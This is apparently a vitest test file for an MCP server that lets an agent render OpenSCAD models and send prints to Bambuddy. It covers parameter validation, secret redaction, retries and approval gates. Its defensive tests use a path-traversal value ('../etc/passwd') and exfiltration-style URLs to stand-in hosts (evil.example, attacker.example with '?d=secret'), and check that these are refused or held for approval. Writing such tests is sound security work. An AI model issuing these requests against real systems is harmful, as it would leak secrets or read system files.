import { readFileSync } from 'node:fs'
import { http, HttpResponse } from 'msw'
import { setupServer } from 'msw/node'
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest'
import { tiersUpTo } from '../src/auth/principal.js'
import { ALL_TOOLS } from '../src/tools/index.js'
import { PendingActionStore } from '../src/tools/pending.js'
import { RUN_REATTEMPTS } from '../src/tools/print.js'
import { runTool, type Tool, type ToolContext } from '../src/tools/registry.js'
import { sameRepository } from '../src/tools/libraries.js'
import { redact } from '../src/tools/settings.js'
import { validateParams } from '../src/tools/validate.js'
import { unwrapUntrusted } from '../src/safety/untrusted.js'
import { OPENSCAD_COLOUR_NAMES } from '../src/tools/colours.js'
import { BACKEND, firstText, services } from './helpers/mcp.js'

// Handlers against an msw backend, called with `execute` where a test needs
// an outward tool's real behaviour (after approval, #258), and through
// `runTool` where the gate is the point.

const server = setupServer()
beforeAll(() => server.listen({ onUnhandledRequest: 'error' }))
afterEach(() => server.resetHandlers())
afterAll(() => server.close())

function tool(name: string): Tool {
  const t = ALL_TOOLS.find((x) => x.name === name)
  if (!t) throw new Error(`no tool ${name}`)
  return t
}

function ctx(overrides: Partial<ToolContext> = {}): ToolContext {
  return {
    ...services(),
    principal: { id: 'test', kind: 'browser', tiers: tiersUpTo('outward') },
    progress: async () => {},
    signal: new AbortController().signal,
    ...overrides,
  }
}

const SCHEMA = {
  groups: [],
  parameters: [
    { name: 'width', type: 'number', initial: 10, min: 1, max: 100 },
    { name: 'count', type: 'integer', initial: 2 },
    { name: 'style', type: 'select', initial: 'round', options: [{ name: 'Round', value: 'round' }, { name: 'Square', value: 'square' }] },
    { name: 'label', type: 'string', initial: '', max_length: 5 },
    { name: 'colour', type: 'color', initial: '#ff0000' },
    { name: 'logo', type: 'file', initial: 'default-logo.svg', accept: ['svg'], samples: ['default-logo.svg', 'star.svg'] },
  ],
}

describe('validateParams', () => {
  it('accepts values the customizer could produce and reports effective values', () => {
    const report = validateParams(SCHEMA as never, { width: 50, style: 'square', colour: '#00ff00' })
    expect(report.valid).toBe(true)
    expect(report.effective).toMatchObject({ width: 50, count: 2, style: 'square', label: '' })
  })

  it('names each problem', () => {
    const report = validateParams(SCHEMA as never, {
      width: 500,
      count: 1.5,
      style: 'hex',
      label: 'too long',
      colour: 'not a colour!',
      logo: 'other.svg',
      nope: 1,
    })
    expect(report.valid).toBe(false)
    expect(Object.fromEntries(report.issues.map((i) => [i.param, i.problem]))).toEqual({
      width: 'must be at most 100',
      count: 'must be a whole number',
      style: 'must be one of "round", "square"',
      label: 'must be at most 5 characters',
      colour: 'must be a colour: #rgb, #rgba, #rrggbb or #rrggbbaa, or an SVG colour name OpenSCAD knows (e.g. "red")',
      logo: 'must be "" (none), the default ("default-logo.svg"), a sample file ("default-logo.svg", "star.svg"), or an asset id from upload_asset',
      nope: 'is not a parameter of this model',
    })
  })
})

describe('validateParams: file values the backend accepts (assets.py file_assets)', () => {
  const ok = (logo: string) => validateParams(SCHEMA as never, { logo }).valid
  it('accepts "", the non-empty default, a shipped sample and an uploaded asset id', () => {
    expect(ok('')).toBe(true)
    expect(ok('default-logo.svg')).toBe(true)
    expect(ok('star.svg')).toBe(true)
    expect(ok('c'.repeat(64))).toBe(true)
  })
  it('refuses anything else, including a path', () => {
    expect(ok('other.svg')).toBe(false)
    expect(ok('../etc/passwd')).toBe(false)
  })
})

describe('validateParams: colours OpenSCAD knows', () => {
  const ok = (colour: string) => validateParams(SCHEMA as never, { colour }).valid
  it('accepts SVG names in any case and every hex form', () => {
    for (const c of ['red', 'CornflowerBlue', ' darkslategrey ', '#f00', '#f008', '#ff0000', '#ff000080']) {
      expect(ok(c), c).toBe(true)
    }
  })
  it('refuses unknown names and malformed hex', () => {
    for (const c of ['cerulean', 'banana', 'rebeccapurple', 'ff0000', '#ff000', '#gg0000', '']) expect(ok(c), c).toBe(false)
  })
  it("matches the backend's measured list (backend/scadbuddy/render/colours.py CSS_COLOURS) exactly", () => {
    const source = readFileSync(new URL('../../backend/scadbuddy/render/colours.py', import.meta.url), 'utf8')
    const block = /CSS_COLOURS[^{]*\{([\s\S]*?)\n\}/.exec(source)?.[1] ?? ''
    const backend = [...block.matchAll(/"([^"]+)"\s*:/g)].map((m) => m[1])
    expect(backend.length).toBeGreaterThan(100)
    expect([...OPENSCAD_COLOUR_NAMES].sort()).toEqual(backend.sort())
  })
})

describe('redact', () => {
  it('hides secret-looking fields but keeps has_* flags', () => {
    expect(redact({ bambuddy_url: 'http://b', has_api_key: true, api_key: 'k', nested: [{ token: 't' }] })).toEqual({
      bambuddy_url: 'http://b',
      has_api_key: true,
      api_key: '[redacted]',
      nested: [{ token: '[redacted]' }],
    })
  })
})

describe('settings tools pass every answer through redact (#322)', () => {
  it('get_settings shows where each key setting comes from, never a key', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/settings`, () =>
        HttpResponse.json({
          has_api_key: true,
          bambuddy_api_key: 's3cret',
          sources: { bambuddy_api_key: 'stored', google_fonts_api_key: 'env', render_timeout: 'default' },
          applies: { bambuddy_api_key: 'live', google_fonts_api_key: 'live' },
        }),
      ),
    )
    const body = firstText(await runTool(tool('get_settings'), {}, ctx()))
    expect(body).toEqual({
      has_api_key: true,
      bambuddy_api_key: '[redacted]',
      sources: { bambuddy_api_key: 'stored', google_fonts_api_key: 'env', render_timeout: 'default' },
      applies: { bambuddy_api_key: 'live', google_fonts_api_key: 'live' },
    })
    expect(JSON.stringify(body)).not.toContain('s3cret')
  })

  it('still redacts a value under a key-named entry in sources that is not a label', () => {
    expect(redact({ sources: { bambuddy_api_key: 'sk-live-0123456789abcdef' } })).toEqual({
      sources: { bambuddy_api_key: '[redacted]' },
    })
  })

  it.each([
    ['get_bambuddy_status', '/api/v1/settings/bambuddy'],
    ['get_remembered_choices', '/api/v1/settings/remembered'],
  ])('%s hides a secret-looking field the backend might add later', async (name, path) => {
    server.use(http.get(`${BACKEND}${path}`, () => HttpResponse.json({ version: '1.2.5.6', access_token: 't' })))
    expect(firstText(await runTool(tool(name), {}, ctx()))).toEqual({ version: '1.2.5.6', access_token: '[redacted]' })
  })
})

describe('render_model', () => {
  it('refuses invalid parameters before queueing anything', async () => {
    server.use(http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)))
    const result = await runTool(tool('render_model'), { slug: 'box', params: { width: 0 } }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toBe('not rendered: width must be at least 1')
  })

  it('reports a failed render as a tool error with its log', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
      http.post(`${BACKEND}/api/v1/models/box/render`, () => HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })),
      http.get(`${BACKEND}/api/v1/jobs/j`, () =>
        HttpResponse.json({ id: 'j', slug: 'box', created_at: '', status: 'failed', error: 'syntax error', log_tail: ['ERROR: line 3'] }),
      ),
    )
    const result = await runTool(tool('render_model'), { slug: 'box' }, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toMatchObject({ status: 'failed', error: 'syntax error', log_tail: ['ERROR: line 3'] })
  })

  it('hands back a still-running job after the wait, and saves an output when asked', async () => {
    let status = 'running'
    let saved: unknown
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
      http.post(`${BACKEND}/api/v1/models/box/render`, () => HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })),
      http.get(`${BACKEND}/api/v1/jobs/j`, () => HttpResponse.json({ id: 'j', slug: 'box', created_at: '', status })),
      http.post(`${BACKEND}/api/v1/models/box/outputs`, async ({ request }) => {
        saved = await request.json()
        return HttpResponse.json({ id: '0123456789abcdef0123456789abcdef' }, { status: 201 })
      }),
    )
    const waiting = await runTool(tool('render_model'), { slug: 'box' }, ctx({ renderWaitMs: 20 }))
    expect(firstText(waiting)).toMatchObject({ status: 'running', note: expect.stringContaining('get_render_job') })

    status = 'done'
    const done = await runTool(tool('render_model'), { slug: 'box', save_output: true, output_name: 'v1' }, ctx())
    expect(firstText(done)).toMatchObject({ status: 'done', output: { id: '0123456789abcdef0123456789abcdef' } })
    expect(saved).toEqual({ job_id: 'j', name: 'v1' })
  })

  it('reports a cancelled render as a tool error with its log, settling immediately rather than waiting out renderWaitMs', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/models/box/schema`, () => HttpResponse.json(SCHEMA)),
      http.post(`${BACKEND}/api/v1/models/box/render`, () => HttpResponse.json({ job_id: 'j', status_url: '' }, { status: 202 })),
      http.get(`${BACKEND}/api/v1/jobs/j`, () =>
        HttpResponse.json({
          id: 'j',
          slug: 'box',
          created_at: '',
          status: 'cancelled',
          error: 'cancelled: every request for it was withdrawn',
          log_tail: ['cancelled: every request for it was withdrawn'],
        }),
      ),
    )
    const started = Date.now()
    // A generous renderWaitMs: settling on `cancelled` must return well before it
    // elapses, the way it already does for `failed` -- not poll until the deadline.
    const result = await runTool(tool('render_model'), { slug: 'box' }, ctx({ renderWaitMs: 5000 }))
    expect(Date.now() - started).toBeLessThan(1000)
    expect(result.isError).toBe(true)
    expect(firstText(result)).toMatchObject({
      status: 'cancelled',
      error: 'cancelled: every request for it was withdrawn',
      log_tail: ['cancelled: every request for it was withdrawn'],
    })
  })
})

describe('uploads', () => {
  it('sends a base64 file as multipart form data', async () => {
    let received: { type: string | null; name: string | undefined; bytes: number } | undefined
    server.use(
      http.post(`${BACKEND}/api/v1/models/box/assets`, async ({ request }) => {
        const form = await request.formData()
        const file = form.get('file') as File
        received = { type: request.headers.get('content-type'), name: file.name, bytes: file.size }
        return HttpResponse.json({ id: 'a'.repeat(64) }, { status: 201 })
      }),
    )
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"/>').toString('base64')
    const result = await runTool(tool('upload_asset'), { slug: 'box', filename: 'logo.svg', content_base64: svg }, ctx())
    expect(result.isError).toBeFalsy()
    expect(received?.type).toMatch(/^multipart\/form-data; boundary=/)
    expect(received).toMatchObject({ name: 'logo.svg', bytes: 41 })
  })
})

describe('print_output (as it will run once approved, #258): spool-first, #335', () => {
  const OUT = '0123456789abcdef0123456789abcdef'
  const FILAMENTS = {
    library_file_id: 5,
    slots: [{ slot_id: 1 }, { slot_id: 2 }],
    spools: [{ spool_id: 10, material: 'PLA' }, { spool_id: 11, material: 'PETG' }, { spool_id: 12, material: 'PLA' }],
    suggested: [
      { slot_id: 1, spool_id: 10 },
      { slot_id: 2, spool_id: 11 },
    ],
  }
  function choicesView(model_choices: Record<string, unknown> = {}) {
    return http.get(`${BACKEND}/api/v1/print/outputs/${OUT}/choices`, () =>
      HttpResponse.json({ printer_id: 1, bed_type: 'Cool Plate', filaments: FILAMENTS, model_choices }),
    )
  }
  const RUN = 'fedcba9876543210fedcba9876543210'
  const RESULT = { library_file_id: 5, copies: 1, bambuddy_url: 'http://b', queue_item_ids: [9] }
  const running = { id: RUN, output_id: OUT, status: 'running', created_at: '2026-09-28T00:00:00Z' }
  // #470: the POST answers 202 with a running run, which the tool follows to its end.
  function capturedRun(into: { body?: unknown }, ended: Record<string, unknown> = { status: 'succeeded', result: RESULT }) {
    return [
      http.post(`${BACKEND}/api/v1/print/outputs/${OUT}/run`, async ({ request }) => {
        into.body = await request.json()
        return HttpResponse.json(running, { status: 202 })
      }),
      http.get(`${BACKEND}/api/v1/print/runs/${RUN}`, () => HttpResponse.json({ ...running, ...ended })),
    ]
  }

  it('with every choice given, runs without reading the dialog', async () => {
    const run: { body?: unknown } = {}
    // No choices handler: reading it would be an unhandled request.
    server.use(...capturedRun(run))
    const result = await tool('print_output').execute(
      {
        output_id: OUT,
        printer_id: 2,
        copies: 2,
        filament_plan: { slots: [{ slot_id: 1, spool_id: 12 }] },
        nozzles: [{ size: '0.6' }],
        tier: 'draft',
        bed_type: 'Textured PEI Plate',
        filament_overrides: { '1': { source: 'cloud', id: 'GFSA04' } },
      },
      ctx(),
    )
    expect(result.isError).toBeFalsy()
    expect(firstText(result)).toMatchObject({ id: RUN, status: 'succeeded', result: RESULT })
    expect(run.body).toEqual({
      printer_id: 2,
      copies: 2,
      plate_id: 1,
      all_plates: false,
      filament_plan: { slots: [{ slot_id: 1, spool_id: 12 }], force_colour_match: false },
      choices: {
        nozzles: [{ size: '0.6', flow: 'standard' }],
        tier: 'draft',
        process_name: null,
        bed_type: 'Textured PEI Plate',
        filament_overrides: { '1': { source: 'cloud', id: 'GFSA04' } },
      },
      options: {},
      request_id: expect.stringMatching(/^[0-9a-f-]{36}$/),
    })
    // Omitted, so the backend files it under the remembered project; null would be "No project".
    expect(run.body).not.toHaveProperty('project_id')
  })

  it('sends a new request_id per call, so the same choices again are a new print (#470)', async () => {
    const first: { body?: { request_id?: string } } = {}
    const second: { body?: { request_id?: string } } = {}
    const args = { output_id: OUT, printer_id: 2, filament_plan: { slots: [] }, nozzles: [{ size: '0.4' }], tier: 'standard', bed_type: 'Cool Plate' }
    server.use(...capturedRun(first))
    await tool('print_output').execute(args, ctx())
    server.use(...capturedRun(second))
    await tool('print_output').execute(args, ctx())
    expect(first.body?.request_id).toBeTruthy()
    expect(second.body?.request_id).toBeTruthy()
    expect(second.body?.request_id).not.toBe(first.body?.request_id)
  })

  describe('a POST or poll that ScadBuddy never answered (#470)', () => {
    const args = { output_id: OUT, printer_id: 2, filament_plan: { slots: [] }, nozzles: [{ size: '0.4' }], tier: 'standard', bed_type: 'Cool Plate' }
    function posts(answers: Array<() => Response>) {
      const ids: string[] = []
      const handler = http.post(`${BACKEND}/api/v1/print/outputs/${OUT}/run`, async ({ request }) => {
        ids.push(((await request.json()) as { request_id: string }).request_id)
        const answer = answers[Math.min(ids.length, answers.length) - 1]!
        return answer()
      })
      return { ids, handler }
    }
    const done = http.get(`${BACKEND}/api/v1/print/runs/${RUN}`, () => HttpResponse.json({ ...running, status: 'succeeded', result: RESULT }))

    it('re-sends a dropped POST with the same request_id and follows the run it started', async () => {
      const { ids, handler } = posts([() => HttpResponse.error(), () => HttpResponse.json(running, { status: 202 })])
      server.use(handler, done)
      const result = await tool('print_output').execute(args, ctx())
      expect(result.isError).toBeFalsy()
      expect(firstText(result)).toMatchObject({ id: RUN, status: 'succeeded' })
      expect(ids).toHaveLength(2)
      expect(ids[1]).toBe(ids[0])
    })

    it.each([502, 503, 504, 524])("re-sends after a proxy's own %i page, with the same request_id", async (code) => {
      const { ids, handler } = posts([
        () => new HttpResponse('<html>upstream timed out</html>', { status: code, headers: { 'content-type': 'text/html' } }),
        () => HttpResponse.json(running, { status: 202 }),
      ])
      server.use(handler, done)
      const result = await tool('print_output').execute(args, ctx())
      expect(result.isError).toBeFalsy()
      expect(ids).toHaveLength(2)
      expect(ids[1]).toBe(ids[0])
    })

    it("never re-sends a problem the backend wrote, even a 503", async () => {
      const { ids, handler } = posts([
        () => HttpResponse.json({ title: 'Service Unavailable', detail: 'Bambuddy is not reachable.' }, { status: 503 }),
      ])
      server.use(handler)
      const result = await runTool({ ...tool('print_output'), gated: false }, args, ctx())
      expect(result.isError).toBe(true)
      expect(firstText(result)).toContain('Bambuddy is not reachable.')
      expect(ids).toHaveLength(1)
    })

    it('gives up after the re-sends and says the print may have started', async () => {
      const { ids, handler } = posts([() => HttpResponse.error()])
      server.use(handler)
      const result = await runTool({ ...tool('print_output'), gated: false }, args, ctx())
      expect(result.isError).toBe(true)
      expect(firstText(result)).toContain("may still have started: check Bambuddy's queue")
      expect(ids).toHaveLength(RUN_REATTEMPTS + 1)
      expect(new Set(ids).size).toBe(1)
    })

    it('re-reads an unanswered poll, and a poll that stays unanswered names the run', async () => {
      const { ids, handler } = posts([() => HttpResponse.json(running, { status: 202 })])
      let reads = 0
      server.use(
        handler,
        http.get(`${BACKEND}/api/v1/print/runs/${RUN}`, () =>
          ++reads === 1 ? HttpResponse.error() : HttpResponse.json({ ...running, status: 'succeeded', result: RESULT }),
        ),
      )
      expect(firstText(await tool('print_output').execute(args, ctx()))).toMatchObject({ status: 'succeeded' })
      expect(reads).toBe(2)

      server.use(http.get(`${BACKEND}/api/v1/print/runs/${RUN}`, () => HttpResponse.error()))
      const lost = await runTool({ ...tool('print_output'), gated: false }, args, ctx())
      expect(lost.isError).toBe(true)
      expect(firstText(lost)).toContain(`print run ${RUN} was started`)
      expect(firstText(lost)).toContain('get_print_run')
      expect(ids).toHaveLength(2)
    })
  })

  it('passes a chosen project through', async () => {
    const run: { body?: unknown } = {}
    server.use(choicesView(), ...capturedRun(run))
    const result = await tool('print_output').execute({ output_id: OUT, project_id: 7 }, ctx())
    expect(result.isError).toBeFalsy()
    expect(run.body).toMatchObject({ project_id: 7 })
  })

  it('sends an explicit null as "No project", which wins over the remembered one', async () => {
    const run: { body?: unknown } = {}
    server.use(choicesView(), ...capturedRun(run))
    const result = await tool('print_output').execute({ output_id: OUT, project_id: null }, ctx())
    expect(result.isError).toBeFalsy()
    expect(run.body).toHaveProperty('project_id', null)
  })

  it('says what omitting the project and null each mean', () => {
    expect(tool('print_output').description).toMatch(/project_id.*remembered.*null.*No project/s)
  })

  it('fills omitted choices the way the dialog opens: defaults and the suggested spools', async () => {
    const run: { body?: unknown } = {}
    server.use(choicesView(), ...capturedRun(run))
    const result = await tool('print_output').execute({ output_id: OUT }, ctx())
    expect(result.isError).toBeFalsy()
    expect(run.body).toMatchObject({
      printer_id: 1,
      filament_plan: { slots: FILAMENTS.suggested },
      choices: {
        nozzles: [
          { size: '0.4', flow: 'standard' },
          { size: '0.4', flow: 'standard' },
        ],
        tier: 'standard',
        process_name: null,
        bed_type: 'Cool Plate',
      },
    })
  })

  it("prefers the model's remembered nozzles, process and in-stock spools", async () => {
    const run: { body?: unknown } = {}
    server.use(
      choicesView({
        nozzles: [{ size: '0.2', flow: 'standard' }],
        tier: null,
        process_name: '0.06mm Fine @BBL H2C 0.2 nozzle',
        // Spool 99 is gone from the inventory, so slot 2 falls back to the suggestion.
        filament_plan: [
          { slot_id: 1, spool_id: 12 },
          { slot_id: 2, spool_id: 99 },
        ],
      }),
      ...capturedRun(run),
    )
    await tool('print_output').execute({ output_id: OUT }, ctx())
    expect(run.body).toMatchObject({
      filament_plan: {
        slots: [
          { slot_id: 1, spool_id: 12 },
          { slot_id: 2, spool_id: 11 },
        ],
      },
      choices: { nozzles: [{ size: '0.2', flow: 'standard' }], tier: null, process_name: '0.06mm Fine @BBL H2C 0.2 nozzle' },
    })
  })

  it('reads the filament step for all plates itself', async () => {
    const run: { body?: unknown } = {}
    let asked: URLSearchParams | undefined
    server.use(
      choicesView(),
      http.get(`${BACKEND}/api/v1/print/outputs/${OUT}/filaments`, ({ request }) => {
        asked = new URL(request.url).searchParams
        return HttpResponse.json({ ...FILAMENTS, slots: [{ slot_id: 3 }], suggested: [{ slot_id: 3, spool_id: 12 }] })
      }),
      ...capturedRun(run),
    )
    await tool('print_output').execute({ output_id: OUT, all_plates: true }, ctx())
    expect(asked?.get('all_plates')).toBe('true')
    expect(asked?.get('printer_id')).toBe('1')
    expect(run.body).toMatchObject({ all_plates: true, filament_plan: { slots: [{ slot_id: 3, spool_id: 12 }] } })
  })

  const CHOSEN = {
    output_id: OUT,
    printer_id: 1,
    filament_plan: { slots: [] },
    nozzles: [{ size: '0.4' }],
    tier: 'standard',
    bed_type: 'Cool Plate',
  }

  it("is an error in the backend's words when the run fails after the 202", async () => {
    const failed = { status: 422, title: 'Unprocessable Content', detail: 'Slot 2 has no spool chosen.' }
    server.use(...capturedRun({}, { status: 'failed', error: failed }))
    const result = await runTool({ ...tool('print_output'), gated: false }, CHOSEN, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('(HTTP 422): Slot 2 has no spool chosen.')
    expect(firstText(result)).not.toContain("Bambuddy's queue")
  })

  it('says a run that failed after it tried to queue may be on the queue anyway', async () => {
    const failed = { status: 504, title: 'Gateway Timeout', detail: 'Bambuddy did not answer in time.' }
    server.use(...capturedRun({}, { status: 'failed', error: failed, may_have_queued: true }))
    const result = await runTool({ ...tool('print_output'), gated: false }, CHOSEN, ctx())
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain("may still have been queued: check Bambuddy's queue")
  })

  it('hands back a run still slicing when the wait runs out', async () => {
    server.use(...capturedRun({}, { status: 'running' }))
    const result = await runTool({ ...tool('print_output'), gated: false }, CHOSEN, ctx({ renderWaitMs: 20 }))
    expect(firstText(result)).toMatchObject({ id: RUN, status: 'running', note: expect.stringContaining('get_print_run') })
    const read = await runTool(tool('get_print_run'), { run_id: RUN }, ctx())
    expect(firstText(read)).toMatchObject({ id: RUN, status: 'running' })
  })

  it("passes the resolver's refusal through", async () => {
    server.use(
      http.post(`${BACKEND}/api/v1/print/outputs/${OUT}/run`, () =>
        HttpResponse.json({ title: 'Unprocessable', detail: 'Slot 2 has no spool chosen.' }, { status: 422 }),
      ),
    )
    const result = await runTool(
      { ...tool('print_output'), gated: false },
      { output_id: OUT, printer_id: 1, filament_plan: { slots: [] }, nozzles: [{ size: '0.4' }], tier: 'standard', bed_type: 'Cool Plate' },
      ctx(),
    )
    expect(result.isError).toBe(true)
    expect(firstText(result)).toContain('Slot 2 has no spool chosen.')
  })

  it('passes a Bambuddy scope error through with its detail', async () => {
    server.use(
      http.post(`${BACKEND}/api/v1/outputs/0123456789abcdef0123456789abcdef/send`, () =>
        HttpResponse.json(
          { title: 'Bambuddy API key lacks a scope', detail: 'The API key needs "Manage Library" to upload the 3MF' },
          { status: 403 },
        ),
      ),
    )
    const result = await runTool(tool('send_to_bambuddy'), { output_id: '0123456789abcdef0123456789abcdef' }, { ...ctx(), pending: new PendingActionStore() })
    // Through runTool it is only prepared …
    expect(firstText(result)).toMatchObject({ status: 'pending_approval' })
    // … and once executed, the scope error reaches the agent verbatim.
    const executed = await runTool({ ...tool('send_to_bambuddy'), gated: false }, { output_id: '0123456789abcdef0123456789abcdef' }, ctx())
    expect(executed.isError).toBe(true)
    expect(firstText(executed)).toContain('"untrusted_data"')
    expect(firstText(executed)).toContain('needs \\"Manage Library\\"')
  })
})

describe('get_printer_camera (#796)', () => {
  it("returns the printer's current frame as an image, marked untrusted", async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/print/printers/7/camera`, () =>
        new HttpResponse(new Uint8Array([0xff, 0xd8, 0xff, 0xd9]), { headers: { 'content-type': 'image/jpeg' } }),
      ),
    )
    const result = await runTool(tool('get_printer_camera'), { printer_id: 7 }, ctx())
    expect(result.isError).toBeFalsy()
    expect(JSON.parse((result.content[0] as { text: string }).text)).toMatchObject({
      untrusted_data: { tool: 'get_printer_camera', content_follows: { type: 'image', mime_type: 'image/jpeg' } },
    })
    expect(result.content[1]).toMatchObject({ type: 'image', mimeType: 'image/jpeg' })
  })
})

describe('analyze_geometry', () => {
  it('is a read tool returning the backend analysis', async () => {
    const id = 'a'.repeat(32)
    server.use(
      http.get(`${BACKEND}/api/v1/outputs/${id}/geometry`, () => HttpResponse.json({ open_edges: 0, bbox_mm: { size: [1, 2, 3] } })),
    )
    const t = tool('analyze_geometry')
    expect(t.risk).toBe('read')
    const result = await runTool(t, { output_id: id }, ctx({ principal: { id: 'r', kind: 'bearer', tiers: ['read'] } }))
    expect(firstText(result)).toEqual({ open_edges: 0, bbox_mm: { size: [1, 2, 3] } })
  })
})

describe('preset tools carry a description and tags (#327)', () => {
  it('save_preset and update_preset send them, and refuse a comma in a tag', async () => {
    const bodies: unknown[] = []
    const record = async ({ request }: { request: Request }) => {
      bodies.push(await request.json())
      return HttpResponse.json({ id: 'p', name: 'P', origin: 'mine', params: {}, description: 'D', tags: ['a'] })
    }
    server.use(
      http.post(`${BACKEND}/api/v1/models/m/presets`, record),
      http.patch(`${BACKEND}/api/v1/models/m/presets/p`, record),
    )
    await runTool(tool('save_preset'), { slug: 'm', name: 'P', description: 'D', tags: ['a'] }, ctx())
    await runTool(tool('update_preset'), { slug: 'm', preset_id: 'p', tags: [] }, ctx())
    expect(bodies).toEqual([
      { name: 'P', params: {}, description: 'D', tags: ['a'] },
      { name: null, params: null, description: null, tags: [] },
    ])
    const refused = await runTool(tool('save_preset'), { slug: 'm', name: 'P', tags: ['M3, M4'] }, ctx())
    expect(refused.isError).toBe(true)
    expect(bodies).toHaveLength(2)
  })
})

describe('tools that make the backend fetch a URL (exfiltration, not SSRF)', () => {
  const CATALOGUE = [{ name: 'BOSL2', url: 'https://github.com/BelfrySCAD/BOSL2', ref: 'v2.0.0', homepage: '', licence: '' }]

  it('import_model is gated: it only prepares, the backend is never called', async () => {
    const result = await runTool(tool('import_model'), { url: 'https://evil.example/x?d=secret' }, ctx())
    expect(firstText(result)).toMatchObject({
      status: 'pending_approval',
      summary: 'Fetch and import a model from https://evil.example/x?d=secret',
    })
  })

  it('fetch_asset is gated, and once approved posts the URL to the backend (#844)', async () => {
    const url = 'https://www.svgrepo.com/download/1/unicorn.svg'
    const pending = await runTool(tool('fetch_asset'), { slug: 'box', url }, ctx())
    expect(firstText(pending)).toMatchObject({
      status: 'pending_approval',
      summary: `Fetch ${url} (www.svgrepo.com) into model "box" as a file asset`,
    })
    expect(tool('fetch_asset').risk).toBe('outward')

    const bodies: unknown[] = []
    server.use(
      http.post(`${BACKEND}/api/v1/models/box/assets/fetch`, async ({ request }) => {
        bodies.push(await request.json())
        return HttpResponse.json({ id: 'a'.repeat(64), name: 'unicorn.svg', kind: 'svg', size: 10, source_url: url }, { status: 201 })
      }),
    )
    const done = await runTool({ ...tool('fetch_asset'), gated: false }, { slug: 'box', url }, ctx())
    expect(firstText(done)).toMatchObject({ id: 'a'.repeat(64), source_url: url })
    expect(bodies).toEqual([{ url }])
  })

  it('pin_library runs unattended for a catalogue library, with or without its own URL', async () => {
    const puts: unknown[] = []
    server.use(
      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
      http.put(`${BACKEND}/api/v1/models/box/libraries/BOSL2`, async ({ request }) => {
        puts.push(await request.json())
        return HttpResponse.json({ slug: 'box' })
      }),
    )
    expect((await runTool(tool('pin_library'), { slug: 'box', name: 'BOSL2' }, ctx())).isError).toBeFalsy()
    const sameRepo = { slug: 'box', name: 'BOSL2', url: 'HTTPS://GitHub.com/BelfrySCAD/BOSL2.git/', ref: 'v2.1.0' }
    expect((await runTool(tool('pin_library'), sameRepo, ctx())).isError).toBeFalsy()
    expect(puts).toEqual([
      { ref: null, url: null },
      { ref: 'v2.1.0', url: null },
    ])
  })

  it('pin_library refuses a non-catalogue URL and points to the outward tool', async () => {
    let put = false
    server.use(
      http.get(`${BACKEND}/api/v1/libraries`, () => HttpResponse.json(CATALOGUE)),
      http.put(`${BACKEND}/api/v1/models/box/libraries/:name`, () => {
        put = true
        return HttpResponse.json({})
      }),
    )
    for (const args of [
      { slug: 'box', name: 'BOSL2', url: 'https://attacker.example/BOSL2?d=secret' },
      { slug: 'box', name: 'NotInCatalogue', url: 'https://github.com/BelfrySCAD/BOSL2' },
    ]) {
      const result = await runTool(tool('pin_library'), args, ctx())
      expect(result.isError).toBe(true)
      expect(firstText(result)).toContain('pin_library_from_url')
    }
    expect(put).toBe(false)
  })

  it('pin_library_from_url is gated', async () => {
    const result = await runTool(
      tool('pin_library_from_url'),
      { slug: 'box', name: 'mylib', url: 'https://example.com/mylib.git', ref: 'v1' },
      ctx(),
    )
    expect(firstText(result)).toMatchObject({ status: 'pending_approval' })
    expect(tool('pin_library_from_url').risk).toBe('outward')
    expect(tool('import_model').risk).toBe('outward')
    expect(tool('pin_library').risk).toBe('write')
  })

  it('compares repositories the way the backend does', () => {
    expect(sameRepository('https://github.com/o/r', 'HTTPS://GITHUB.COM/o/r.git/')).toBe(true)
    expect(sameRepository('https://github.com/o/r', 'https://github.com/O/r')).toBe(false)
    expect(sameRepository('https://github.com/o/r', 'https://github.com/o/r2')).toBe(false)
  })
})

describe('binary results: inline under the cap, a link over it', () => {
  const OUT = 'a'.repeat(32)

  it('returns a small 3MF inline as an embedded resource', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/outputs/${OUT}/model.3mf`, () =>
        new HttpResponse(new Uint8Array([1, 2, 3, 4]), { headers: { 'content-type': 'model/3mf' } }),
      ),
    )
    const result = await runTool(tool('download_3mf'), { output_id: OUT }, ctx({ maxInlineBytes: 16 }))
    expect(result.isError).toBeFalsy()
    expect(result.content).toEqual([
      // #258: a preamble names the tool and source of the blob that follows.
      { type: 'text', text: expect.stringContaining('"content_follows"') },
      {
        type: 'resource',
        resource: { uri: `scadbuddy://outputs/${OUT}/model.3mf`, mimeType: 'model/3mf', blob: 'AQIDBA==' },
      },
    ])
  })

  it('links, not fails, when the declared size is over the cap', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/outputs/${OUT}/model.3mf`, () =>
        new HttpResponse(new Uint8Array(64), { headers: { 'content-type': 'model/3mf', 'content-length': '64' } }),
      ),
    )
    const result = await runTool(
      tool('download_3mf'),
      { output_id: OUT },
      ctx({ maxInlineBytes: 16, publicBaseUrl: 'https://scadbuddy.example/' }),
    )
    expect(result.isError).toBeFalsy()
    expect(result.content[0]).toMatchObject({
      type: 'resource_link',
      uri: `https://scadbuddy.example/api/v1/outputs/${OUT}/model.3mf`,
      mimeType: 'model/3mf',
      size: 64,
    })
    expect(JSON.parse(unwrapUntrusted((result.content[1] as { text: string }).text))).toMatchObject({
      inline: false,
      size_bytes: 64,
      fetch: { method: 'GET', path: `/api/v1/outputs/${OUT}/model.3mf` },
    })
  })

  it('links when a streamed body with no length outgrows the cap, and uses the bare path without a public URL', async () => {
    server.use(
      http.get(`${BACKEND}/api/v1/jobs/eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee/preview.glb`, () => {
        const body = new ReadableStream<Uint8Array>({
